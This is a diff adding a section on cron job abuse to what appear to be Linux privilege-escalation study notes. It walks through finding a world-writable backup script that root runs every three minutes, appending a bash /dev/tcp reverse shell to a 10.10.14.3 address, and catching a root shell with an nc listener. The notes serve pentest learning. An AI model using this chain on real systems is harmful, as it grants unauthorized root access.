@@ -1359,3 +1359,82 @@ screen -ls # loads the malicious library via setuid root
 
 ---
 
+# Cron Job Abuse
+
+## What Are Cron Jobs?
+- Cron jobs are scheduled tasks in Unix/Linux systems.
+- Configured in **crontab** files and executed by the **cron daemon**.
+- Typical use cases: backups, cleanup tasks, system maintenance.
+- Crontab entry format:
+```
+
+minute hour day month weekday command
+
+````
+Example:  
+`0 */12 * * * /home/admin/backup.sh` → runs every 12 hours.
+
+## Security Risks
+- **Root crontab** usually only editable by root or sudoers.
+- Misconfigurations can lead to **privilege escalation**:
+- World-writable scripts executed by root.
+- Cron files in `/etc/cron.d` editable by non-root users.
+- Incorrect scheduling (e.g., running too frequently).
+
+## Example Exploit Scenario
+1. **Discovery**  
+ - Found a suspicious script: `/dmz-backups/backup.sh`.
+ - Script and directory were **world-writable**.
+ - Backups created every 3 minutes → likely misconfigured (`*/3 * * * *` instead of `0 */3 * * *`).
+
+ ```bash
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+````
+Find all regular files anywhere on the system (except /proc) that anyone can write to, and don’t show error messages.
+```bash
+ls -la /dmz-backups/
+```
+
+2. **Verification with pspy**
+ pspy = Process Spy, a Linux tool often used in privilege escalation / red-team ops. It lets you see running processes and cron jobs on a system without root
+
+   * `pspy64 -pf -i 1000` showed `/dmz-backups/backup.sh` being executed by **root** every 3 minutes. (command - Run pspy on a 64-bit system, and every 1 second, show me any new processes that start, including their full command line arguments) .
+
+   ```
+   CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh
+   ```
+
+4. **Original Script**
+
+   ```bash
+   #!/bin/bash
+   SRCDIR="/var/www/html"
+   DESTDIR="/dmz-backups/"
+   FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
+   tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
+   ```
+
+5. **Exploitation**
+
+   * Append a reverse shell payload to the script.
+
+   ```bash
+   #!/bin/bash
+   SRCDIR="/var/www/html"
+   DESTDIR="/dmz-backups/"
+   FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
+   tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
+
+   bash -i >& /dev/tcp/10.10.14.3/443 0>&1
+   ```
+
+6. **Execution**
+
+   * Start a listener:
+
+     ```bash
+     nc -lnvp 443
+     ```
+   * Within 3 minutes, a **root reverse shell** connects back.
+
+---
